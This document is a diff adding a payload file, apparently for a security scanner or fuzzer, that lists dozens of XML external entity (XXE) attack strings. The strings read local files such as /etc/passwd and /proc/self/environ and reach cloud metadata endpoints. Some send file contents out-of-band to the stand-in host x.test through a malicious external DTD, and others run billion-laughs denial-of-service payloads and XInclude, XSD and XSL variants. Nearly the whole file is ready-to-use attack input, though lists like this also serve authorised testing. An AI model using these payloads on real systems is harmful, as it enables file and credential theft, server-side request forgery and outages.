@@ -1,0 +1,101 @@
+# category: xxe
+# description: XML external entity probes — classic, OOB, blind, parameter entity, XInclude.
+# references: OWASP XXE, PortSwigger XXE labs.
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://x.test/xxe">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://x.test/evil.dtd"> %xxe;]><foo>test</foo>
+<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://x.test/evil.dtd"><foo>test</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://x.test/j.jar!/x">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://x.test:1234/_test">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://x.test/?x=%file;'>">%eval;%exfil;]><foo>test</foo>
+<?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>
+<?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://x.test/evil"/></root>
+<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"]><lolz>&lol4;</lolz>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://x.test/parameter.dtd">%remote;]><foo>&trick;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % param "<!ENTITY exfil SYSTEM 'file:///etc/passwd'>"> %param;]><foo>&exfil;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE doc [<!ENTITY xxe PUBLIC "any" "file:///etc/passwd">]><doc>&xxe;</doc>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "data:text/plain;base64,aGVsbG8K">]>&xxe;
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]><root><name>&xxe;</name></root>
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]><foo/>
+<?xml version="1.0"?><!DOCTYPE t [<!ELEMENT t (#PCDATA)><!ENTITY x SYSTEM "file:///etc/passwd">]><t>&x;</t>
+<?xml-stylesheet type="text/xsl" href="http://x.test/evil.xsl"?><doc/>
+<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///dev/random">]><f>&x;</f>
+<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///proc/self/environ">]><f>&x;</f>
+<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///proc/self/cmdline">]><f>&x;</f>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ldap://x.test:389/dc=x">]><foo>&xxe;</foo>
+
+# ── OOB with external DTD ────────────────────────────────────────────────
+<!-- evil.dtd on x.test:
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.test/?x=%data;'>">
+%param1;
+-->
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://x.test/evil.dtd">%remote;%exfil;]><foo/>
+
+# ── XInclude (works against limited DOCTYPE acceptors) ───────────────────
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///c:/windows/win.ini" parse="text"/></foo>
+
+# ── SOAP / WSDL / docx / svg wrappers ────────────────────────────────────
+<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope><soap:Body>&xxe;</soap:Body></soap:Envelope>
+<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>
+PK\x03\x04   [office-open-xml .docx with embedded DOCTYPE in word/document.xml]
+<?xml version="1.0"?><!DOCTYPE t [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><Workbook><t>&xxe;</t></Workbook>
+
+# ── File upload-triggered XXE (SVG/DOCX/XLSX) ────────────────────────────
+<!DOCTYPE t [<!ENTITY % a SYSTEM "data:text/plain,abc">%a;]><t/>
+<!DOCTYPE t [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><t>&xxe;</t>
+<!DOCTYPE t [<!ENTITY xxe SYSTEM "jar:file:///tmp/x.jar!/x">]><t>&xxe;</t>
+
+# ── Billion-laughs / recursive-entity DOS probes ─────────────────────────
+<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "a"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><l>&c;</l>
+<?xml version="1.0"?><!DOCTYPE l [<!ENTITY % a "<!ENTITY x SYSTEM 'file:///dev/urandom'>">%a;]><l>&x;</l>
+
+# ── Local-only / blind variants ──────────────────────────────────────────
+<!DOCTYPE t SYSTEM "http://x.test/evil.dtd">
+<!DOCTYPE t PUBLIC "-//x//x//EN" "http://x.test/evil.dtd">
+<!DOCTYPE t [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><t>&xxe;</t>
+
+# ── Error-based (reveal content in error messages) ──────────────────────
+<?xml version="1.0"?><!DOCTYPE t [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">%eval;%err;]><t/>
+<?xml version="1.0"?><!DOCTYPE t [<!ENTITY % remote SYSTEM "http://x.test/err.dtd">%remote;%err;]><t/>
+
+# ── Blind with timing via /dev/random ────────────────────────────────────
+<?xml version="1.0"?><!DOCTYPE t [<!ENTITY x SYSTEM "file:///dev/urandom">]><t>&x;</t>
+<?xml version="1.0"?><!DOCTYPE t [<!ENTITY x SYSTEM "file:///dev/stdin">]><t>&x;</t>
+
+# ── SSRF via XXE ─────────────────────────────────────────────────────────
+<?xml version="1.0"?><!DOCTYPE t [<!ENTITY x SYSTEM "http://127.0.0.1:22">]><t>&x;</t>
+<?xml version="1.0"?><!DOCTYPE t [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><t>&x;</t>
+<?xml version="1.0"?><!DOCTYPE t [<!ENTITY x SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><t>&x;</t>
+<?xml version="1.0"?><!DOCTYPE t [<!ENTITY x SYSTEM "http://[::1]:80/">]><t>&x;</t>
+
+# ── XInclude variants (works where DOCTYPE is blocked) ──────────────────
+<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text" encoding="UTF-8"/></r>
+<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://x.test/evil.xml" parse="xml"/></r>
+<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///proc/self/environ" parse="text"/></r>
+
+# ── XSD-based SSRF ───────────────────────────────────────────────────────
+<?xml version="1.0"?><xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"><xs:include schemaLocation="http://x.test/evil.xsd"/></xs:schema>
+<?xml version="1.0"?><xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"><xs:import namespace="x" schemaLocation="http://x.test/evil.xsd"/></xs:schema>
+
+# ── XSL-based ────────────────────────────────────────────────────────────
+<?xml-stylesheet type="text/xsl" href="http://x.test/evil.xsl"?>
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"><xsl:template match="/"><xsl:value-of select="document('http://x.test/')"/></xsl:template></xsl:stylesheet>
+
+# ── SOAP-with-doctype ────────────────────────────────────────────────────
+<?xml version="1.0"?><!DOCTYPE soapenv [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><a>&xxe;</a></soapenv:Body></soapenv:Envelope>
+
+# ── Apache-FOP / Batik / Jackson XmlMapper quirks ───────────────────────
+<!DOCTYPE t [<!ENTITY % a SYSTEM "http://x.test/evil.ent">%a;]>
+<!DOCTYPE t [<!ENTITY % a SYSTEM "file:///etc/passwd">%a;]>
+<!DOCTYPE t [<!ENTITY % a "<!ENTITY b SYSTEM 'file:///etc/passwd'>">%a;]><t>&b;</t>
